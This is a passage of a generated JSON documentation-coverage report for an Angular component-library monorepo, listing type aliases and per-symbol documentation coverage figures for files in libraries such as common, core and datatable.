          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "literal type",
          "file": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 181
        }
      ],
      "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts": [
        {
          "name": "PaneType",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "\"left\" | \"right\"",
          "file": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 186
        }
      ],
      "libs/common/src/lib/theme/theme-saver.service.ts": [
        {
          "name": "ReturnValue",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "Promise<T> | Observable<T> | T",
          "file": "libs/common/src/lib/theme/theme-saver.service.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 186
        }
      ],
      "libs/datatable/src/lib/sto-datatable/models.ts": [
        {
          "name": "rowClassFn",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "function",
          "file": "libs/datatable/src/lib/sto-datatable/models.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 178
        }
      ],
      "libs/common/src/lib/theme/models.ts": [
        {
          "name": "ThemeClassName",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "\"sto-light-theme\" | \"sto-dark-theme\"",
          "file": "libs/common/src/lib/theme/models.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 186
        },
        {
          "name": "ThemeName",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "\"light\" | \"dark\"",
          "file": "libs/common/src/lib/theme/models.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 186
        },
        {
          "name": "TypographyClassName",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "\"sto-sm-typography\" | \"sto-m-typography\" | \"sto-l-typography\"",
          "file": "libs/common/src/lib/theme/models.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 186
        },
        {
          "name": "TypographyName",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "\"small\" | \"medium\" | \"large\"",
          "file": "libs/common/src/lib/theme/models.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 186
        }
      ]
    }
  },
  "routes": [],
  "coverage": {
    "count": 6,
    "status": "low",
    "files": [
      {
        "filePath": "apps/oilmod-web-e2e/src/support/app.po.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "getGreeting",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "apps/oilmod-web-e2e/src/support/commands.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "Chainable",
        "coveragePercent": 0,
        "coverageCount": "0/2",
        "status": "low"
      },
      {
        "filePath": "apps/oilmod-web/src/app/app.component.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "primary",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "apps/oilmod-web/src/app/app.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "AppComponent",
        "coveragePercent": 0,
        "coverageCount": "0/2",
        "status": "low"
      },
      {
        "filePath": "apps/oilmod-web/src/environments/environment.prod.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "environment",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "apps/oilmod-web/src/environments/environment.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "environment",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "jest.config.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/preference-manager/active-preference.pipe.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "ActivePreferencePipe",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/preference-manager/preference-manager.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "PreferenceManagerComponent",
        "coveragePercent": 41,
        "coverageCount": "12/29",
        "status": "medium"
      },
      {
        "filePath": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "preferences",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Usage",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/preference-manager/preference.ts",
        "type": "class",
        "linktype": "classe",
        "name": "Preference",
        "coveragePercent": 66,
        "coverageCount": "6/9",
        "status": "good"
      },
      {
        "filePath": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "ActionFooter",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-action-footer/sto-action-footer.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoActionFooterComponent",
        "coveragePercent": 44,
        "coverageCount": "4/9",
        "status": "medium"
      },
      {
        "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "AppHeader",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "AsTestEnvironment",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "withForm",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "WithUserMenu",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-app-header/sto-app-header.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoAppHeaderComponent",
        "coveragePercent": 42,
        "coverageCount": "6/14",
        "status": "medium"
      },
      {
        "filePath": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "Breadcrumb",
        "coveragePercent": 0,
        "coverageCount": "0/7",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "BreadcrumbConfig",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "NAVIGATION_HOME_ICON",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoBreadcrumbsComponent",
        "coveragePercent": 29,
        "coverageCount": "5/17",
        "status": "medium"
      },
      {
        "filePath": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Breadcrumbs",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
        "type": "component",
        "linktype": "component",
        "name": "ConfirmDemoComponent",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Usage",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "ConfirmComponent",
        "coveragePercent": 20,
        "coverageCount": "1/5",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
        "type": "injectable",
        "linktype": "injectable",
        "name": "ConfirmService",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "dialogConfig",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "FilterPanel",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-filter/filter.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "FilterForm",
        "coveragePercent": 15,
        "coverageCount": "2/13",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-filter/filter.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "FilterList",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoFilterActionsBar",
        "coveragePercent": 0,
        "coverageCount": "0/8",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoFilterPanelComponent",
        "coveragePercent": 42,
        "coverageCount": "8/19",
        "status": "medium"
      },
      {
        "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "StoFilterActions",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "StoFilterTableActions",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "StoFilterTitle",
        "coveragePercent": 100,
        "coverageCount": "1/1",
        "status": "very-good"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Accent",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "argTypes",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Danger",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Dismissable",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Primary",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Success",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "UsageWithInput",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Warn",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Warning",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoMessagePanelComponent",
        "coveragePercent": 15,
        "coverageCount": "2/13",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "COLORS",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/theme/models.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "ThemeModel",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/theme/models.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "themes",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/theme/models.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "typography",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/theme/svg-icons.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "iconMap",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/theme/theme-saver.service.ts",
        "type": "injectable",
        "linktype": "injectable",
        "name": "ThemeSaverService",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/theme/theme-saver.service.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "ThemeSaver",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/theme/theme-saver.service.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "THEME_SAVER",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/lib/theme/theme.service.ts",
        "type": "injectable",
        "linktype": "injectable",
        "name": "StoThemeService",
        "coveragePercent": 0,
        "coverageCount": "0/20",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/test-utils.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "breadCrumbs",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "context",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/common/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "require",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/context-menu.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "ContextMenuDirective",
        "coveragePercent": 0,
        "coverageCount": "0/6",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/date-form-field-click.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "DateFormFieldClickDirective",
        "coveragePercent": 12,
        "coverageCount": "1/8",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/directives.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "StoContextMenu",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/directives.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "StoGrid",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/menu-overlay.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "MenuOverlayDirective",
        "coveragePercent": 0,
        "coverageCount": "0/9",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/quick-keys.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "QuickKeysDirective",
        "coveragePercent": 88,
        "coverageCount": "8/9",
        "status": "very-good"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "StoGridColumnDirective",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "StoGridDirective",
        "coveragePercent": 0,
        "coverageCount": "0/11",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "StoGridSpacerDirective",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "BreakpointConfig",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "ALL_GRIDS",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "getClass",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-directives/sto-select-text-on-focus.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "StoSelectTextOnFocusDirective",
        "coveragePercent": 50,
        "coverageCount": "5/10",
        "status": "medium"
      },
      {
        "filePath": "libs/core/src/lib/sto-pipes/currency-format.pipe.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "CurrencyFormatPipe",
        "coveragePercent": 100,
        "coverageCount": "1/1",
        "status": "very-good"
      },
      {
        "filePath": "libs/core/src/lib/sto-pipes/date-format.pipe.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "DateFormatPipe",
        "coveragePercent": 100,
        "coverageCount": "1/1",
        "status": "very-good"
      },
      {
        "filePath": "libs/core/src/lib/sto-pipes/keys.pipe.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "KeysPipe",
        "coveragePercent": 100,
        "coverageCount": "1/1",
        "status": "very-good"
      },
      {
        "filePath": "libs/core/src/lib/sto-pipes/number-format.pipe.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "NumberFormatPipe",
        "coveragePercent": 100,
        "coverageCount": "1/1",
        "status": "very-good"
      },
      {
        "filePath": "libs/core/src/lib/sto-pipes/with-unit.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "ExcludeUnit",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-pipes/with-unit.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "GetUnit",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-pipes/yes-no.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "YesNoPipe",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-user-preference/sto-user-preference.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoUserPreferenceComponent",
        "coveragePercent": 0,
        "coverageCount": "0/7",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
        "type": "injectable",
        "linktype": "injectable",
        "name": "StoUserPreferenceService",
        "coveragePercent": 0,
        "coverageCount": "0/8",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "preferenceKey",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/styles.stories.ts",
        "type": "component",
        "linktype": "component",
        "name": "DialogDemoComponent",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/styles.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "StoCard",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/styles.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "StoDialog",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/lib/styles.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "StoTheme",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "context",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/core/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "require",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Actionbar",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "AutoSize",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Grouped",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "MultilineFooter",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Paging",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "ResponsiveMode",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/datatable.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "NormalUse",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/rows.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "columns",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/rows.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "fixedColumns",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/rows.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "manyColumns",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/rows.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "pipe",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/rows.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "rows",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/column-style.pipe.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "ColumnStylePipe",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/columns.ts",
        "type": "class",
        "linktype": "classe",
        "name": "Column",
        "coveragePercent": 0,
        "coverageCount": "0/17",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/columns.ts",
        "type": "class",
        "linktype": "classe",
        "name": "ColumnGroup",
        "coveragePercent": 0,
        "coverageCount": "0/5",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/columns.ts",
        "type": "class",
        "linktype": "classe",
        "name": "Group",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "Activate",
        "coveragePercent": 0,
        "coverageCount": "0/5",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "ContextMenu",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "RowActivation",
        "coveragePercent": 0,
        "coverageCount": "0/2",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "RowCtx",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "RowSelection",
        "coveragePercent": 0,
        "coverageCount": "0/2",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/exec.pipe.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "ExecPipe",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/get-group-flex.pipe.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "GetGroupFlexPipe",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/models.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "SortColumn",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
